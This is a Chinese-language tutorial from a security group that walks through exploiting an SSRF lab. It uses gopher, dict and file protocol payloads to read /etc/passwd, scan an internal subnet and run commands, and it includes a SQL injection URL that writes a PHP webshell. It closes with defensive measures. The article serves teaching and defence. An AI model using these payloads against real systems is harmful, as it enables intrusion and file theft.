---
title: SSRF作为入口点的利用
url: https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652501002&idx=1&sn=0299e0cefc7a00f81824028845302d86&chksm=f25857b9c52fdeafa3645b7a444791a712f21e2e0e01eafe39b4ab6d45d3cb118e07ed5d13d1&scene=58&subscene=0#rd
source: 雷神众测
date: 2022-12-14
fetch_date: 2025-10-04T01:24:39.963699
---

# SSRF作为入口点的利用

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhuRqFLJLLYlXBMyDYvk8qXVWOL1ZXI8gdxRyWKwHWahmzJ9Gofnr0ow/0?wx_fmt=jpeg)

# SSRF作为入口点的利用

原创

北少

雷神众测

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhTEb8ryerbr1jgibwEBnxib8kT93rJSRn0uDHLqIALEu1n0PIkCfbos4w/640?wx_fmt=png)

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NR5R9fiamcOhwjiceugfUFhw3biaBaAL6dJNkciagqczSsKlNghyor0OFibpKS9E2JSnibxM9Etm8EUlP9/640?wx_fmt=svg)

SSRF入口的利用

SSRF是由一种攻击者构造请求，由服务器端发起请求的安全漏洞。一般情况下SSRF的攻击目标是外网无法访问到的内部系统。（正因为请求是由服务器发起的，所以服务器端能请求到与自身相连而与外网隔离的内部系统。）

这里我用了个靶场：

https://github.com/sqlsec/ssrf-vuls

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NR5R9fiamcOhwjiceugfUFhw3biaBaAL6dJNkciagqczSsKlNghyor0OFibpKS9E2JSnibxM9Etm8EUlP9/640?wx_fmt=svg)

服务端请求访问

```
常见的攻击协议

Gopher协议
对目标攻击的主要协议
gopher://xxxxx:port/主体
主体部分需要url编码

Dict协议
探测端口操作，以及版本信息
dict://xxxxx:port/info
http://xxx.xxx.xx.xx/xx/xx.php?url=http://172.21.0.2:6379（http也可以）

ftp协议
只能探测是否存在ftp，不能进行爆破

http协议
用来探测是否存在ssrf
sftp:// ldap://

file协议
读取文件协议
刺探支持的协议（修改协议头即可）

gopher://<host>:<post>/<gopher-path>_后面接TCP数据流（扫描）
dict://xxxxx:port/info（例:dict://xxxxx:22/info，dict://xxxxx:6379/info）（爆破）
ftp:///etc/passwd（file://c:\windows\win.ini，如果报错返回绝对地址更再好不过了）
http://xxxxx:port/（扫描）
file://（读取文件内容）
```

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NR5R9fiamcOhwjiceugfUFhw3biaBaAL6dJNkciagqczSsKlNghyor0OFibpKS9E2JSnibxM9Etm8EUlP9/640?wx_fmt=svg)

靶场

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhW3ELNMTWdniaq7auudZ3EV5DP9zg8gELssXicUa51fNE4ibHWTtWBk4QQ/640?wx_fmt=png)

搭建完成后 访问http://url:8080/

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvh9UQU9iaqmUicpeXQic2xpsu0iaqeg0dMLb1yXEvECXiap94ZWWA0qeEz90g/640?wx_fmt=png)

随便请求内网,发现套娃 存在SSRF漏洞

```
http://127.0.0.1:8080
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhJm9uAXKjKiatPE9oKDp17aGBlI1lm8hM7tgYhCNEy5vlAViaHJwpXmmQ/640?wx_fmt=png)

```
file:///etc/passwd            # 读取配置文件
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhxMX8QicOG3gKaNKY4ibyRfWYTZTA2ZF2VAMoZucCtjI09mXgDDib3ibrSw/640?wx_fmt=png)

```
file:///etc/hosts     	# 查看hosts文件
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhib9Txm4gZ5tB2Bp0PlOHrEys56r4gzrLrI1PcEXibIRyyTomkicSEgU9Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NR5R9fiamcOhwjiceugfUFhw3biaBaAL6dJNkciagqczSsKlNghyor0OFibpKS9E2JSnibxM9Etm8EUlP9/640?wx_fmt=svg)

探索内部资产

可以用dict进行探测服务 加上前面看到了172.72.23.0网段

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhMGA70vdeBqTaB8LQM9qXFDVRPIOIqia4X4bVkMtUofT6g0kEzzT3sBw/640?wx_fmt=png)

暴力破解IP和端口

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhCDKWermvYp1uIWhdE89wtWpLldXbMicdTt7hia9qsJQkayGic6MHvGPVw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhrELXJOnBtFysGbGQtMWy0lZNys3GibYKCtJbgLUpt5RTf6Zic8uLsNuA/640?wx_fmt=png)

探测到非常多服务

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NR5R9fiamcOhwjiceugfUFhw3biaBaAL6dJNkciagqczSsKlNghyor0OFibpKS9E2JSnibxM9Etm8EUlP9/640?wx_fmt=svg)

代码执行

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhhlL1R8OuWXLMjT9unmicFktm051Eqicz3hq1QRBEECF4ALtX6VJukQiaA/640?wx_fmt=png)

访问172.72.23.22 发现提示，发现里面有一个shell.php的文件

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhvjosicicKsARCMEOZ8KJUbfyVAicZCrHcPcNYD5pFHS01nJssvR6UReWQ/640?wx_fmt=png)

是一个简单的命令执行，使用cat%20/flag 直接读取flag

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvh7zqkuBzicEwIwK2sxhxd83koicwGxVJFd7hAdvicrgbZWzxqabiaDx9LIw/640?wx_fmt=png)

```
flag{a8ebc494c479c9f03fc353b3ba81040d}
```

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NR5R9fiamcOhwjiceugfUFhw3biaBaAL6dJNkciagqczSsKlNghyor0OFibpKS9E2JSnibxM9Etm8EUlP9/640?wx_fmt=svg)

SQL注入

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhv15ClztcwBYp7TxOxEjEv6lLgGksxTXQkdFWIk9zDKXibY5BRs55bBw/640?wx_fmt=png)

访问第二个172.72.23.23 是一个sql注入的题目

简单的get注入 判断出为4列

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhncdJQEbicpE8FibDQTkrSm4oicibVBFQibFylic0LCTPdBvgyiah46cD3NLOw/640?wx_fmt=png)

然后进行一些简单查询

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhJFIQqjuBe0TibnvgibMficicChHrjQK6Y8lC2h0OOnu6fbqvLxz88bX04A/640?wx_fmt=png)

接下来直接些webshell了

```
http://172.72.23.23/?id=1'%20union%20select%201,2,3,'<?php%20system($_GET[a]);%20?>'%20INTO%20DUMPFILE%20'/var/www/html/shell.php'--+
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhl9icibqSCQOmd1icBkQhZoU6V5FicAMQppicX2hTnxP6lg3t5K6NjC0cVTw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NR5R9fiamcOhwjiceugfUFhw3biaBaAL6dJNkciagqczSsKlNghyor0OFibpKS9E2JSnibxM9Etm8EUlP9/640?wx_fmt=svg)

命令执行

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhWdpMemcrEC4PKDexe8dDiaiaIYaTapDZ37PfTs9cusf1V9icFg5gOZ2bg/640?wx_fmt=png)因为是post提交数据的所以没办法直接提交

```
gopher://ip:端口/_请求内网POST数据包进行2次URL编码

Accept-Encoding: gzip, deflate   # 记得删除！！！
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhtQsWQh6rgns8T6abl3Maiao45FHmMatxkga0xibT1I7IvFkU9wian8KTQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhjmybzkdwNXIgx2lxzquPr4rbtq1JqicuZRljLbibEibFeae587AFCwUeg/640?wx_fmt=png)

成功执行命令

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NR5R9fiamcOhwjiceugfUFhw3biaBaAL6dJNkciagqczSsKlNghyor0OFibpKS9E2JSnibxM9Etm8EUlP9/640?wx_fmt=svg)

防护措施

1.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。
2.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
3.限制请求的端口为http常用的端口，比如，80,443,8080,8090。
4.黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。
5.禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。

**安恒信息**

✦

杭州亚运会网络安全服务官方合作伙伴

成都大运会网络信息安全类官方赞助商

武汉军运会、北京一带一路峰会

青岛上合峰会、上海进博会

厦门金砖峰会、G20杭州峰会

支撑单位北京奥运会等近百场国家级

重大活动网络安保支撑单位

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhG1AMYN1pnoopgLFwS1MjLDuO411K8FSu0O2jEX3osz7ObEEE9tTdWg/640?wx_fmt=jpeg)

END

![](https://mmbiz.qpic.cn/mmbiz_gif/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhnB2IpZzHZBlQqRENiaTGCtHibwbdzE1QSOstWQbZavjU1ia3T8ic6iaGuGg/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhcYT8QWc8EpbyMvJqZ9LhTzHmsGw6v22c4DyWiad0pdUicqxELwUEXbEg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/HxO8NorP4JW6gickxXibOdZ9GX1FGDfLvhTvqaZwgM8sEb2PlQ6fu8ribbJXJqDGU0uV2zDossYp19atQY23HufiaA/640?wx_fmt=gif)

**长按识别二维码关注我们**

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXR4T1FPu3xWeia88A3vf9jricoWSZL9S5lgnSdQiaibu0xaMXwojMqj62dlEG7DNkrNAbMu6quah2YLQ/0?wx_fmt=png)

雷神众测

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXR4T1FPu3xWeia88A3vf9jricoWSZL9S5lgnSdQiaibu0xaMXwojMqj62dlEG7DNkrNAbMu6quah2YLQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过